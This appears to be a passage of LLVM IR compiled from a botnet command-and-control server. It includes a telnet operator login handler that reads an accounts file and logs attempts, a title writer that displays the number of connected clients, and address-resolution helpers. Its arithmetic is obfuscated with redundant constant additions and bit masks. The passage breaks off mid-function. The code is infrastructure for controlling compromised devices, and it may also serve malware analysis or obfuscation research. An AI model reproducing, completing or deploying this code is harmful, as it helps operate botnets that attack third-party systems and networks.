define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %49

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %30, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %37

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %30

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add i32 %24, 1694560666
  %26 = add i32 %25, 1
  %27 = sub i32 %26, 1694560666
  %28 = add nsw i32 %24, 1
  store i32 %27, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  br label %30

; <label>:30:                                     ; preds = %23, %18
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, %31
  %33 = sub i32 0, 1
  %34 = add i32 %32, %33
  %35 = sub i32 0, %34
  %36 = add nsw i32 %31, 1
  store i32 %35, i32* %5, align 4
  br label %13

; <label>:37:                                     ; preds = %13
  %38 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %39 = icmp ne %struct._IO_FILE* %38, null
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %37
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %42 = call i32 @fclose(%struct._IO_FILE* %41)
  br label %43

; <label>:43:                                     ; preds = %40, %37
  %44 = load i32, i32* %6, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %43
  store i32 0, i32* %2, align 4
  br label %49

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* %7, align 4
  store i32 %48, i32* %2, align 4
  br label %49

; <label>:49:                                     ; preds = %47, %46, %11
  %50 = load i32, i32* %2, align 4
  ret i32 %50
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %5 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 0
  store i64 %0, i64* %5, align 4
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 1
  store i64 %1, i64* %6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = xor i32 255, -1
  %11 = xor i32 %9, %10
  %12 = and i32 %11, %9
  %13 = and i32 %9, 255
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %16 = load i32, i32* %15, align 4
  %17 = xor i32 %16, -1
  %18 = xor i32 65280, -1
  %19 = xor i32 71511342, -1
  %20 = or i32 %17, %18
  %21 = or i32 71511342, %19
  %22 = xor i32 %20, -1
  %23 = and i32 %22, %21
  %24 = and i32 %16, 65280
  %25 = lshr i32 %23, 8
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = xor i32 %28, -1
  %30 = xor i32 16711680, -1
  %31 = xor i32 -678992052, -1
  %32 = or i32 %29, %30
  %33 = or i32 -678992052, %31
  %34 = xor i32 %32, -1
  %35 = and i32 %34, %33
  %36 = and i32 %28, 16711680
  %37 = lshr i32 %35, 16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  %41 = xor i32 -16777216, -1
  %42 = xor i32 %40, %41
  %43 = and i32 %42, %40
  %44 = and i32 %40, -16777216
  %45 = lshr i32 %43, 24
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i32 0, i32 0), i32 %12, i32 %25, i32 %37, i32 %45)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @hostname_to_ip(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0)) #7
  store i32 1, i32* %3, align 4
  br label %44

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

; <label>:18:                                     ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %43

; <label>:25:                                     ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #7
  %35 = call i8* @strcpy(i8* %26, i8* %34) #7
  store i32 0, i32* %3, align 4
  br label %44
                                                  ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 0, %37
  %39 = sub i32 0, 1
  %40 = add i32 %38, %39
  %41 = sub i32 0, %40
  %42 = add nsw i32 %37, 1
  store i32 %41, i32* %8, align 4
  br label %18

; <label>:43:                                     ; preds = %18
  store i32 1, i32* %3, align 4
  br label %44

; <label>:44:                                     ; preds = %43, %25, %12
  %45 = load i32, i32* %3, align 4
  ret i32 %45
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [4 x i8*], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1000 x i8], align 16
  store i8* %0, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = ptrtoint i8* %9 to i64
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %4, align 4
  %12 = bitcast [4 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([4 x i8*]* @titleWriter.spinbuf to i8*), i64 32, i32 16, i1 false)
  %13 = bitcast [1000 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1000, i32 16, i1 false)
  br label %14

; <label>:14:                                     ; preds = %44, %1
  store i32 0, i32* %7, align 4
  br label %15

; <label>:15:                                     ; preds = %38, %14
  %16 = load i32, i32* %7, align 4
  %17 = sext i32 %16 to i64
  %18 = icmp ult i64 %17, 4
  br i1 %18, label %19, label %44

; <label>:19:                                     ; preds = %15
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 2048, i32 16, i1 false)
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %22 = call i32 @clientsConnected()
  %23 = load i32, i32* %7, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4 x i8*], [4 x i8*]* %6, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i32 0, i32 0
  %28 = call i32 (i8*, i8*, ...) @sprintf(i8* %21, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i32 0, i32 0), i32 27, i32 %22, i8* %26, i8* %27, i32 7) #7
  %29 = load i32, i32* %4, align 4
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %32 = call i64 @strlen(i8* %31) #8
  %33 = call i64 @send(i32 %29, i8* %30, i64 %32, i32 16384)
  %34 = icmp eq i64 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %19
  br label %36

; <label>:36:                                     ; preds = %35, %19
  %37 = call i32 @sleep(i32 1)
  br label %38

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %7, align 4
  %40 = add i32 %39, 523703696
  %41 = add i32 %40, 1
  %42 = sub i32 %41, 523703696
  %43 = add nsw i32 %39, 1
  store i32 %42, i32* %7, align 4
  br label %15

; <label>:44:                                     ; preds = %15
  br label %14
                                                  ; No predecessors!
  %46 = load i8*, i8** %2, align 8
  ret i8* %46
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca %struct._IO_FILE*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca [512 x i8], align 16
  %28 = alloca [512 x i8], align 16
  %29 = alloca [100 x i8*], align 16
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca [20 x i8], align 16
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca [50 x i8*], align 16
  %43 = alloca %struct._IO_FILE*, align 8
  %44 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  %48 = load volatile i32, i32* @managesConnected, align 4
  %49 = sub i32 %48, -1200643066
  %50 = add i32 %49, 1
  %51 = add i32 %50, -1200643066
  %52 = add nsw i32 %48, 1
  store volatile i32 %51, i32* @managesConnected, align 4
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %53, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8** %12, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i32 0, i32 0), i8** %13, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8** %14, align 8
  store i32 0, i32* %16, align 4
  %54 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 16, i1 false)
  %55 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %19, align 4
  %56 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %56, %struct._IO_FILE** %18, align 8
  br label %57

; <label>:57:                                     ; preds = %67, %1
  %58 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %59 = call i32 @feof(%struct._IO_FILE* %58) #7
  %60 = icmp ne i32 %59, 0
  %61 = xor i1 %60, true
  %62 = and i1 true, %61
  %63 = xor i1 true, true
  %64 = and i1 %60, %63
  %65 = or i1 %62, %64
  %66 = xor i1 %60, true
  br i1 %65, label %67, label %74

; <label>:67:                                     ; preds = %57
  %68 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %69 = call i32 @fgetc(%struct._IO_FILE* %68)
  store i32 %69, i32* %20, align 4
  %70 = load i32, i32* %19, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %19, align 4
  br label %57

; <label>:74:                                     ; preds = %57
  store i32 0, i32* %21, align 4
  %75 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  call void @rewind(%struct._IO_FILE* %75)
  br label %76

; <label>:76:                                     ; preds = %84, %74
  %77 = load i32, i32* %21, align 4
  %78 = load i32, i32* %19, align 4
  %79 = sub i32 %78, 1180248803
  %80 = sub i32 %79, 1
  %81 = add i32 %80, 1180248803
  %82 = sub nsw i32 %78, 1
  %83 = icmp ne i32 %77, %81
  br i1 %83, label %84, label %106

; <label>:84:                                     ; preds = %76
  %85 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %86 = load i32, i32* %21, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %87
  %89 = getelementptr inbounds %struct.account, %struct.account* %88, i32 0, i32 0
  %90 = getelementptr inbounds [200 x i8], [200 x i8]* %89, i32 0, i32 0
  %91 = load i32, i32* %21, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.account, %struct.account* %93, i32 0, i32 1
  %95 = getelementptr inbounds [200 x i8], [200 x i8]* %94, i32 0, i32 0
  %96 = load i32, i32* %21, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.account, %struct.account* %98, i32 0, i32 2
  %100 = getelementptr inbounds [200 x i8], [200 x i8]* %99, i32 0, i32 0
  %101 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %85, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* %90, i8* %95, i8* %100)
  %102 = load i32, i32* %21, align 4
  %103 = sub i32 0, 1
  %104 = sub i32 %102, %103
  %105 = add nsw i32 %102, 1
  store i32 %104, i32* %21, align 4
  br label %76

; <label>:106:                                    ; preds = %76
  %107 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %108 = load i32, i32* %4, align 4
  %109 = call i32 @fdgets(i8* %107, i32 2048, i32 %108)
  %110 = icmp slt i32 %109, 1
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %106
  br label %985

; <label>:112:                                    ; preds = %106
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %114 = load i8*, i8** %14, align 8
  %115 = call i8* @strstr(i8* %113, i8* %114) #8
  %116 = icmp ne i8* %115, null
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %112
  br label %119

; <label>:118:                                    ; preds = %112
  br label %985

; <label>:119:                                    ; preds = %117
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %121 = call i32 (i8*, i8*, ...) @sprintf(i8* %120, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i32 0, i32 0)) #7
  %122 = load i32, i32* %4, align 4
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %125 = call i64 @strlen(i8* %124) #8
  %126 = call i64 @send(i32 %122, i8* %123, i64 %125, i32 16384)
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %119
  br label %985

; <label>:129:                                    ; preds = %119
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %131 = load i32, i32* %4, align 4
  %132 = call i32 @fdgets(i8* %130, i32 2048, i32 %131)
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %129
  br label %985

; <label>:135:                                    ; preds = %129
  %136 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %136)
  %137 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %139 = call i32 (i8*, i8*, ...) @sprintf(i8* %137, i8* %138) #7
  %140 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %140, i8** %9, align 8
  %141 = load i8*, i8** %9, align 8
  %142 = call i32 @Search_in_File(i8* %141)
  store i32 %142, i32* %5, align 4
  %143 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %143, %struct._IO_FILE** %22, align 8
  %144 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %145 = load i8*, i8** %9, align 8
  %146 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %144, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %145)
  %147 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %148 = call i32 @fclose(%struct._IO_FILE* %147)
  %149 = load i8*, i8** %9, align 8
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %149)
  %151 = load i8*, i8** %9, align 8
  %152 = load i32, i32* %5, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.account, %struct.account* %154, i32 0, i32 0
  %156 = getelementptr inbounds [200 x i8], [200 x i8]* %155, i32 0, i32 0
  %157 = call i32 @strcmp(i8* %151, i8* %156) #8
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %159, label %188

; <label>:159:                                    ; preds = %135
  %160 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %161 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i32 0, i32 0)) #7
  %162 = load i32, i32* %4, align 4
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %165 = call i64 @strlen(i8* %164) #8
  %166 = call i64 @send(i32 %162, i8* %163, i64 %165, i32 16384)
  %167 = icmp eq i64 %166, -1
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %159
  br label %985

; <label>:169:                                    ; preds = %159
  %170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %171 = load i32, i32* %4, align 4
  %172 = call i32 @fdgets(i8* %170, i32 2048, i32 %171)
  %173 = icmp slt i32 %172, 1
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %169
  br label %985

; <label>:175:                                    ; preds = %169
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %176)
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %179
  %181 = getelementptr inbounds %struct.account, %struct.account* %180, i32 0, i32 1
  %182 = getelementptr inbounds [200 x i8], [200 x i8]* %181, i32 0, i32 0
  %183 = call i32 @strcmp(i8* %177, i8* %182) #8
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %175
  br label %189

; <label>:186:                                    ; preds = %175
  %187 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %187, i8 0, i64 2048, i32 16, i1 false)
  br label %201

; <label>:188:                                    ; preds = %135
  br label %189

; <label>:189:                                    ; preds = %188, %185
  %190 = load i32, i32* %4, align 4
  %191 = call i64 @send(i32 %190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i64 5, i32 16384)
  %192 = icmp eq i64 %191, -1
  br i1 %192, label %193, label %194

; <label>:193:                                    ; preds = %189
  br label %985

; <label>:194:                                    ; preds = %189
  %195 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %195, %struct._IO_FILE** %23, align 8
  %196 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %197 = load i8*, i8** %9, align 8
  %198 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %196, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0), i8* %197)
  %199 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %200 = call i32 @fclose(%struct._IO_FILE* %199)
  br label %985

; <label>:201:                                    ; preds = %186
  %202 = load i32, i32* %4, align 4
  %203 = call i64 @send(i32 %202, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 14, i32 16384)
  %204 = icmp eq i64 %203, -1
  br i1 %204, label %205, label %206

; <label>:205:                                    ; preds = %201
  br label %985

; <label>:206:                                    ; preds = %201
  %207 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %209
  %211 = getelementptr inbounds %struct.account, %struct.account* %210, i32 0, i32 0
  %212 = getelementptr inbounds [200 x i8], [200 x i8]* %211, i32 0, i32 0
  %213 = call i32 (i8*, i8*, ...) @sprintf(i8* %207, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %212) #7
  %214 = load i32, i32* %4, align 4
  %215 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %216 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %217 = call i64 @strlen(i8* %216) #8
  %218 = call i64 @send(i32 %214, i8* %215, i64 %217, i32 16384)
  %219 = icmp eq i64 %218, -1
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %206
  br label %985

; <label>:221:                                    ; preds = %206
  %222 = load i8*, i8** %3, align 8
  %223 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %222) #7
  %224 = load i32, i32* %4, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %225
  %227 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %226, i32 0, i32 2
  %228 = getelementptr inbounds [20 x i8], [20 x i8]* %227, i32 0, i32 0
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %230
  %232 = getelementptr inbounds %struct.account, %struct.account* %231, i32 0, i32 0
  %233 = getelementptr inbounds [200 x i8], [200 x i8]* %232, i32 0, i32 0
  %234 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %233) #7
  %235 = load i32, i32* %4, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %236
  %238 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %237, i32 0, i32 1
  store i32 1, i32* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %961, %960, %221
  %240 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %241 = load i32, i32* %4, align 4
  %242 = call i32 @fdgets(i8* %240, i32 2048, i32 %241)
  %243 = icmp sgt i32 %242, 0
  br i1 %243, label %244, label %984

; <label>:244:                                    ; preds = %239
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %246 = call i8* @strstr(i8* %245, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %247 = icmp ne i8* %246, null
  br i1 %247, label %256, label %248

; <label>:248:                                    ; preds = %244
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %250 = call i8* @strstr(i8* %249, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i32 0, i32 0)) #8
  %251 = icmp ne i8* %250, null
  br i1 %251, label %256, label %252

; <label>:252:                                    ; preds = %248
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %254 = call i8* @strstr(i8* %253, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i32 0, i32 0)) #8
  %255 = icmp ne i8* %254, null
  br i1 %255, label %256, label %323

; <label>:256:                                    ; preds = %252, %248, %244
  %257 = call i32 @joinn()
  store i32 1, i32* %26, align 4
  store i32 0, i32* %25, align 4
  br label %258

; <label>:258:                                    ; preds = %305, %256
  %259 = load i32, i32* %25, align 4
  %260 = icmp slt i32 %259, 40
  br i1 %260, label %261, label %311

; <label>:261:                                    ; preds = %258
  %262 = load i32, i32* %25, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %263
  %265 = getelementptr inbounds %struct.name, %struct.name* %264, i32 0, i32 1
  %266 = load i32, i32* %265, align 4
  %267 = icmp sle i32 %266, 0
  br i1 %267, label %268, label %274

; <label>:268:                                    ; preds = %261
  %269 = load i32, i32* %25, align 4
  %270 = sext i32 %269 to i64
